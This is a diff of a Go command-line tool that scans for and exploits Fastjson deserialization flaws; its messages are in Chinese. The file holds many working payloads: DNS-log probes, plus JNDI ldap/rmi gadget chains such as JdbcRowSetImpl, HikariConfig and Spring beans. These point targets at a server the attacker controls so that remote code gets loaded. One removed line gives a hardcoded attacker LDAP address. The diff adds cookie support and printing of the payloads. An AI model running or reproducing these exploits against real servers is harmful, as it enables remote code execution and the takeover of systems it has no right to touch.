@@ -14,45 +14,53 @@ import (
 )
 
 var url_list []string
+var Prin string
 
 func main() {
 	v()
 	var dns string
 	var ipFile string
 	var url string
-	var exp string
+	var exp bool
 	var method string
+	var P string
+	var cookie string
 	flag.StringVar(&ipFile, "f", "", "urls file")
 	flag.StringVar(&url, "u", "http://127.0.0.1", "url")
 	flag.StringVar(&dns, "dns", "dns.log", "dnslog")
-	flag.StringVar(&exp, "e", "y", "exp")
 	flag.StringVar(&method, "m", "", "ldap or rmi")
+	flag.StringVar(&P, "p", "n", " y or n :打印payload")
+	flag.StringVar(&cookie, "c", "", " cookie")
+	flag.BoolVar(&exp, "e", true, "EXP")
 	flag.Parse()
 	start := time.Now()
-	if method != "" && exp == "y" {
+	if P == "y" {
+		Prin = "y"
+	}
+	if method != "" && exp == true {
 		fmt.Println("exp攻击")
-		expattack(method, url, dns)
+		expattack(method, url, dns, cookie)
 		os.Exit(0)
 	}
 	if len(os.Args) == 1 {
 		fmt.Println("use: " + os.Args[0] + " " + "-f urlfile -dns dnslog" + "   批量检测")
 		fmt.Println("use: " + os.Args[0] + " " + "-u url -dns dnslog" + "   单独url检测")
-		fmt.Println("usage: " + os.Args[0] + " " + "-e y -u url -m ldap/rmi -dns ip:port " + "   exp攻击")
+		fmt.Println("usage: " + os.Args[0] + " " + "-e -u url -m ldap/rmi -dns ip:port " + "   exp攻击")
 		os.Exit(0)
 	} else if ipFile != "" {
 		array := list(ipFile)
 		num := len(array) - 1
 		for i, v := range array {
 			fmt.Println(strconv.Itoa(i) + "/" + strconv.Itoa(num) + "   " + "Cracking: " + v)
-			FastjsonScan(v, dns)
+			FastjsonScan(v, dns, cookie)
 		}
 	} else if url != "" {
 		fmt.Println("Cracking: " + url)
-		FastjsonScan(url, dns)
+		FastjsonScan(url, dns, cookie)
 	} else {
 		fmt.Println("")
-		fmt.Println("usage: " + os.Args[0] + " " + "-f urlfile" + "   批量检测")
-		fmt.Println("usage: " + os.Args[0] + " " + "-u url" + "   单独url检测")
+		fmt.Println("usage: " + os.Args[0] + " " + "-f urlfile" + " -dns doslog  批量检测")
+		fmt.Println("usage: " + os.Args[0] + " " + "-u url" + "   -dns doslog  单独url检测")
 		fmt.Println("usage: " + os.Args[0] + " " + "-e y -u url -m ldap/rmi -dns ip:port/xxx " + "   exp攻击")
 		os.Exit(0)
 	}
@@ -60,7 +68,7 @@ func main() {
 	fmt.Println("用时:", end.Sub(start), "秒")
 }
 
-func FastjsonScan(url string, dns string) {
+func FastjsonScan(url string, dns string, cookie string) {
 	ur := strings.Split(url, "//")[1]
 	ur1 := strings.Split(ur, "/")[0]
 	if strings.Contains(ur1, ":") {
@@ -79,20 +87,13 @@ func FastjsonScan(url string, dns string) {
 	poc[8] = "{\"a\":{\"@type\": \"java.lang.AutoCloseable\", \"@type\":\"java.io.Reader\"},\"rand1\":{\"@type\":\"java.net.InetSocketAddress\"{\"address\":,\"val\":\"" + dns + "\"}}}"
 	poc[9] = `{"\u0040t\u0079pe":"\u006a\u0061\u0076\u0061.\u006e\u0065\u0074.\u0049\u006e\u0065\u0074\u0034\u0041\u0064\u0064\u0072\u0065\u0073\u0073\","\u0076\u0061\u006c\":"` + dns + `"}`
 	poc[10] = `{"@type":\b"java.net.Inet4Address","val":"` + dns + `"}`
-	startscan(url, poc[0])
-	go startscan(url, poc[1])
-	go startscan(url, poc[2])
-	go startscan(url, poc[3])
-	go startscan(url, poc[4])
-	go startscan(url, poc[5])
-	go startscan(url, poc[6])
-	go startscan(url, poc[7])
-	go startscan(url, poc[8])
-	go startscan(url, poc[9])
-	go startscan(url, poc[10])
+
+	for _, v := range poc {
+		startscan(url, v, cookie)
+	}
 }
 
-func expattack(method string, url string, dns string) {
+func expattack(method string, url string, dns string, cookie string) {
 	poc := method + "://" + dns
 	var exp [19]string
 	exp[0] = `{"name":{"\u0040\u0074\u0079\u0070\u0065":"\u006a\u0061\u0076\u0061\u002e\u006c\u0061\u006e\u0067\u002e\u0043\u006c\u0061\u0073\u0073","\u0076\u0061\u006c":"\u0063\u006f\u006d\u002e\u0073\u0075\u006e\u002e\u0072\u006f\u0077\u0073\u0065\u0074\u002e\u004a\u0064\u0062\u0063\u0052\u006f\u0077\u0053\u0065\u0074\u0049\u006d\u0070\u006c"},"x":{"\u0040\u0074\u0079\u0070\u0065":"\u0063\u006f\u006d\u002e\u0073\u0075\u006e\u002e\u0072\u006f\u0077\u0073\u0065\u0074\u002e\u004a\u0064\u0062\u0063\u0052\u006f\u0077\u0053\u0065\u0074\u0049\u006d\u0070\u006c","\u0064\u0061\u0074\u0061\u0053\u006f\u0075\u0072\u0063\u0065\u004e\u0061\u006d\u0065":"` + poc + `","autoCommit":true}}`
@@ -108,7 +109,7 @@ func expattack(method string, url string, dns string) {
 	exp[3] = `{
 		"rand1": {
 		  "@type": "org.springframework.beans.factory.config.PropertyPathFactoryBean",
-		  "targetBeanName": "ldap://82.157.178.58:1389/Exploit",
+		  "targetBeanName": "` + poc + `",
 		  "propertyPath": "foo",
 		  "beanFactory": {
 			"@type": "org.springframework.jndi.support.SimpleJndiBeanFactory",
@@ -151,18 +152,18 @@ func expattack(method string, url string, dns string) {
 	exp[13] = `{"@type":"org.apache.cocoon.components.slide.impl.JMSContentInterceptor", "parameters": {"@type":"java.util.Hashtable","java.naming.factory.initial":"com.sun.jndi.rmi.registry.RegistryContextFactory","topic-factory":"` + poc + `"}, "namespace":""}`
 	exp[14] = `{"@type":"br.com.anteros.dbcp.AnterosDBCPConfig","healthCheckRegistry":"` + poc + `"}`
 	exp[15] = `{"@type":"org.apache.commons.proxy.provider.remoting.SessionBeanProvider","jndiName":"` + poc + `","Object":"a"}`
-	exp[16] = `[{"@type":"java.lang.Class","val":"com.sun.rowset.JdbcRowSetImpl"},{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":""` + poc + `","autoCommit":true}]`
-	exp[17] = `{"@type":"com.zaxxer.hikari.HikariConfig","metricRegistry":""` + poc + `"}`
-	exp[18] = `{"@type":"com.zaxxer.hikari.HikariConfig","healthCheckRegistry":""` + poc + `"}`
+	exp[16] = `[{"@type":"java.lang.Class","val":"com.sun.rowset.JdbcRowSetImpl"},{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"` + poc + `","autoCommit":true}]`
+	exp[17] = `{"@type":"com.zaxxer.hikari.HikariConfig","metricRegistry":"` + poc + `"}`
+	exp[18] = `{"@type":"com.zaxxer.hikari.HikariConfig","healthCheckRegistry":"` + poc + `"}`
 	for _, v := range exp {
-		startscan(url, v)
+		startscan(url, v, cookie)
 	}
 	fmt.Println("攻击完毕")
 }
 
 var i int
 
-func startscan(url string, poc string) {
+func startscan(url string, poc string, cookie string) {
 	nu := strconv.Itoa(i)
 	var req *http.Request
 	post := poc
@@ -176,6 +177,9 @@ func startscan(url string, poc string) {
 	req.Header.Set("Accept-Encoding", "gzip,deflate")
 	req.Header.Set("Content-Type", "application/json")
 	req.Header.Set("Connection", "close")
+	if cookie != "" {
+		req.Header.Set("Cookie", cookie)
+	}
 	resp, err := client.Do(req)
 	if err != nil {
 		fmt.Println(url + "-- request fail")
@@ -186,6 +190,7 @@ func startscan(url string, poc string) {
 	responseCode := strconv.Itoa(resp.StatusCode)
 	if nu != "" {
 		fmt.Println("EXP:" + nu + "   response:" + responseCode)
+		fmt.Println(poc)
 		i++
 	}
 
